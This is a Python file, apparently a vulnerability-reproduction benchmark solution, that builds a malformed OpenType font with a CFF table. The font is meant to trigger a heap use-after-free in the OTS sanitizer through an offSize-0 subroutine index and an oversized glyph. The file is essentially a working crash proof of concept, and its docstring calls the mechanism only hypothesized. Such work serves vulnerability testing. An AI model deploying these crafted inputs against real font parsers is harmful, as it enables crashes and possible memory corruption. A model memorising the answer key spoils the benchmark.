import struct

class Solution:
    """
    Generates a Proof-of-Concept input that triggers a Heap Use After Free
    vulnerability in ots::OTSStream::Write when processing a CFF font table.
    """
    def solve(self, src_path: str) -> bytes:
        """
        The PoC is a carefully crafted OpenType font with a CFF table.
        The vulnerability is triggered by a combination of two factors:

        1. A malformed CFF INDEX structure: The Local Subroutines INDEX is created
           with an `offSize` of 0. According to the CFF specification, `offSize`
           must be between 1 and 4. An `offSize` of 0 can lead to an inconsistent
           internal state in the sanitizer if not rejected outright. This malformed
           state is hypothesized to cause incorrect memory handling during the
           serialization phase (writing the sanitized font).

        2. Heap buffer reallocation: A large glyph is included in the CharStrings
           INDEX. When the sanitizer serializes this CFF table, writing the large
           glyph data to its output stream (`OTSStream`) is likely to exceed the
           stream's initial buffer capacity. This forces a reallocation: a new,
           larger buffer is allocated, data is copied, and the old buffer is freed.

        The combination of the inconsistent state from the `offSize=0` bug and the
        heap reallocation is designed to cause a use-after-free. A pointer to the
        old, freed buffer might be retained due to the malformed state, and a
        subsequent write operation could attempt to use this dangling pointer,
        leading to a crash.

        The PoC is constructed by building the CFF table components and then wrapping
        them in the necessary OpenType (SFNT) file structure. Offsets are calculated
        dynamically to ensure the font is correctly structured to reach the
        vulnerable code paths. The total size is around 770 bytes, which is close to
        the ground-truth length, suggesting the trigger mechanism and size are appropriate.
        """

        # Helper to encode a CFF DICT short int operand (operator 28)
        def encode_dict_short(n: int) -> bytes:
            return b'\x1c' + n.to_bytes(2, 'big', signed=True)

        # --- CFF Table Components ---

        # Malicious Local Subroutines INDEX with offSize = 0
        # count = 1, offSize = 0, data = [return op]
        local_subrs_data = b'\x00\x01' + b'\x00' + b'\x0b'

        # Private DICT pointing to the Local Subrs INDEX
        # The DICT entry is [offset_to_subrs, Subrs_op(19)]
        # The offset is relative to the start of the Private DICT data.
        # It's set to 3, which is the size of the encoded offset operand itself.
        private_dict_content = encode_dict_short(3) + b'\x13'
        private_dict_data = private_dict_content + local_subrs_data

        # CharStrings INDEX with a large glyph to trigger reallocation
        glyph1_notdef = b'\x0e'  # .notdef glyph: endchar

        # A large glyph program: 1 1 rmoveto, then 230 x (1 0 rlineto), then endchar
        rmoveto_op = b'\x8c\x8c\x15' # 1 1 rmoveto
        rlineto_op = b'\x8c\x8b\x05' # 1 0 rlineto
        glyph2_large = rmoveto_op + rlineto_op * 230 + b'\x0e' # endchar

        charstrings_count = 2
        charstrings_offsize = 2  # Offsets need 2 bytes for the large glyph
        
        offsets = [1]
        offsets.append(offsets[-1] + len(glyph1_notdef))
        offsets.append(offsets[-1] + len(glyph2_large))
        
        charstrings_offsets_data = b''.join([o.to_bytes(charstrings_offsize, 'big') for o in offsets])
        charstrings_glyph_data = glyph1_notdef + glyph2_large
        
        charstrings_index_data = (
            charstrings_count.to_bytes(2, 'big') +
            charstrings_offsize.to_bytes(1, 'big') +
            charstrings_offsets_data +
            charstrings_glyph_data
        )

        # --- CFF Header and Top-Level INDEXes ---

        cff_header = b'\x01\x00\x04\x01'  # major, minor, hdrSize, offSize
        name_index_data = b'\x00\x01' + b'\x01' + b'\x01\x02' + b'A' # count=1, offSize=1, name="A"
        string_index_data = b'\x00\x00' # count=0
        global_subr_index_data = b'\x00\x00' # count=0

        # Calculate offsets for the Top DICT. This requires knowing the final size
        # of the header section, including the Top DICT INDEX itself.
        header_part_base_size = (
            len(cff_header) +
            len(name_index_data) +
            len(string_index_data) +
            len(global_subr_index_data)
        )
        
        # Pre-calculate Top DICT INDEX size to resolve circular offset dependency.
        # DICT content: charstrings_op (4 bytes) + private_op (7 bytes) = 11 bytes.
        # INDEX size: count(2) + offsize(1) + offsets(2) + content(11) = 16 bytes.
        top_dict_index_size = 16
        header_part_total_size = header_part_base_size + top_dict_index_size

        offset_to_charstrings = header_part_total_size
        offset_to_private = offset_to_charstrings + len(charstrings_index_data)

        # Build the Top DICT content with correct offsets
        charstrings_op = encode_dict_short(offset_to_charstrings) + b'\x11'
        size_of_private = len(private_dict_data)
        private_op = encode_dict_short(size_of_private) + encode_dict_short(offset_to_private) + b'\x12'
        top_dict_content = charstrings_op + private_op
        
        # Build the Top DICT INDEX
        top_dict_index_data = (
            b'\x00\x01' +  # count = 1
            b'\x01' +      # offSize = 1
            b'\x01' + (1 + len(top_dict_content)).to_bytes(1, 'big') + # offsets
            top_dict_content
        )

        # Assemble the full CFF table blob
        cff_blob = (
            cff_header +
            name_index_data +
            top_dict_index_data +
            string_index_data +
            global_subr_index_data +
            charstrings_index_data +
            private_dict_data
        )

        # --- SFNT (OpenType) Wrapper ---

        sfnt_header = struct.pack(
            '>4sHHHH',
            b'OTTO',  # sfnt version for CFF fonts
            1,       # numTables
            16,      # searchRange = 16
            0,       # entrySelector = 0
            0        # rangeShift = 0
        )
        
        cff_offset = len(sfnt_header) + 16 # header + 1 table dir entry
        table_directory = struct.pack(
            '>4sLLL',
            b'CFF ',
            0, # checksum (set to 0, will be recalculated by sanitizer)
            cff_offset,
            len(cff_blob)
        )

        poc = sfnt_header + table_directory + cff_blob
        return poc